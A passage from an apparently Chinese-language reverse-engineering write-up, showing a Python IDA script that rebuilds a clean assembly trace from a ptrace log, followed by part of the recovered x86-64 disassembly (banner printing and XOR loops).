</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mnem</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;j&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">mnem</span> <span class="o">==</span> <span class="s1">&#39;ret&#39;</span> <span class="ow">or</span> <span class="n">mnem</span> <span class="o">==</span> <span class="s1">&#39;call&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 移动到下一条指令</span>
</span></span><span class="line"><span class="cl">        <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_and_write_trace</span><span class="p">(</span><span class="n">log_content</span><span class="p">,</span> <span class="n">output_filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    解析日志并按顺序将纯净的汇编指令路径写入文件。
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">segments</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># 正则表达式</span>
</span></span><span class="line"><span class="cl">    <span class="n">get_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;PTRACE_GETREGS, \d+, .*rip=\s*(0x[0-9a-fA-F]+)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">set_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;PTRACE_SETREGS, \d+, .*rip=\s*(0x[0-9a-fA-F]+)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">poke_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;PTRACE_POKEDATA, \d+, 0x[0-9a-fA-F]+, (0x[0-9a-fA-F]+)\)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">current_get</span><span class="p">,</span> <span class="n">current_set</span><span class="p">,</span> <span class="n">current_poke</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">log_content</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">get_match</span> <span class="o">=</span> <span class="n">get_regex</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">set_match</span> <span class="o">=</span> <span class="n">set_regex</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">poke_match</span> <span class="o">=</span> <span class="n">poke_regex</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">get_match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">current_get</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">segments</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">current_get</span><span class="p">,</span> <span class="n">current_set</span><span class="p">,</span> <span class="n">current_poke</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_poke</span> <span class="o">=</span> <span class="kc">None</span> <span class="c1"># 为新段重置</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">ea</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">get_match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_get</span> <span class="o">=</span> <span class="n">ea</span> <span class="k">if</span> <span class="mh">0x4009F7</span> <span class="o">&lt;=</span> <span class="n">ea</span> <span class="o">&lt;=</span> <span class="mh">0x401B82</span> <span class="k">else</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">poke_match</span> <span class="ow">and</span> <span class="n">current_get</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">current_poke</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_poke</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">poke_match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">set_match</span> <span class="ow">and</span> <span class="n">current_get</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">current_set</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">set_match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">current_get</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">segments</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">current_get</span><span class="p">,</span> <span class="n">current_set</span><span class="p">,</span> <span class="n">current_poke</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">segments</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;未在日志中解析出任何有效的执行段。&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 打开文件并写入纯净的汇编代码</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">segments</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">get_A</span><span class="p">,</span> <span class="n">set_A</span><span class="p">,</span> <span class="n">poke_A</span> <span class="o">=</span> <span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">get_B</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">segments</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">end_ea</span> <span class="o">=</span> <span class="n">get_B</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># 1. 写入蹦床代码 (通常是 ret)</span>
</span></span><span class="line"><span class="cl">            <span class="n">write_clean_asm_path</span><span class="p">(</span><span class="n">set_A</span><span class="p">,</span> <span class="n">end_ea</span><span class="p">,</span> <span class="n">f_out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># 2. 写入主逻辑路径 (VM &#39;调用&#39; 的地址)</span>
</span></span><span class="line"><span class="cl">            <span class="n">write_clean_asm_path</span><span class="p">(</span><span class="n">poke_A</span><span class="p">,</span> <span class="n">end_ea</span><span class="p">,</span> <span class="n">f_out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;纯净的汇编跟踪已成功写入到: </span><span class="si">{</span><span class="n">OUTPUT_FILENAME</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- 运行脚本 ---</span>
</span></span><span class="line"><span class="cl"><span class="n">parse_and_write_trace</span><span class="p">(</span><span class="n">log_data</span><span class="p">,</span> <span class="n">OUTPUT_FILENAME</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现代码量非常恐怖，展示一部分:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="cl"><span class="n">push</span><span class="w">    </span><span class="n">rbp</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rbp</span><span class="p">,</span><span class="w"> </span><span class="n">rsp</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sub</span><span class="w">     </span><span class="n">rsp</span><span class="p">,</span><span class="w"> </span><span class="n">20h</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">rdi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">aOooooooooooooO</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;ooooooooooooo                          &#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">a88888888888Y88</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;8&#39;   888   `8                         &#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">a888OoooD8bOooo</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;     888      oooo d8b  .oooo.    .oooo&#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">a8888888pP88bD8</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;     888      `888\&#34;\&#34;8P `P  )88b  d88&#39;&#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">a888888Op888888</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;     888       888      .oP\&#34;888  888  &#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">a888888D8888888</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;     888       888     d8(  888  888   &#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rdi</span><span class="p">,</span><span class="w"> </span><span class="n">aO888oD888bY888</span><span class="p">;</span><span class="w"> </span><span class="s">&#34;    o888o     d888b    `Y888\&#34;\&#34;8o `Y8b&#34;</span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">puts_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edi</span><span class="p">,</span><span class="w"> </span><span class="n">10000h</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">jmp</span><span class="w">     </span><span class="n">cs</span><span class="p">:</span><span class="n">srand_ptr</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_8</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cmp</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">+</span><span class="n">var_8</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">7</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cmp</span><span class="w">     </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">1Fh</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606020</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">esi</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xor</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606020</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606120</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">esi</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">18h</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">rdx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movzx</span><span class="w">   </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">[</span><span class="n">rax</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">8</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">shl</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">rbp</span><span class="o">-</span><span class="n">4</span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">add</span><span class="w">     </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">edx</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xor</span><span class="w">     </span><span class="n">ecx</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">movsxd</span><span class="w">  </span><span class="n">rdx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lea</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte_606120</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mov</span><span class="w">     </span><span class="o">[</span><span class="n">rdx</span><span class="o">+</span><span class="n">rax</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">cl</span><span class="w">
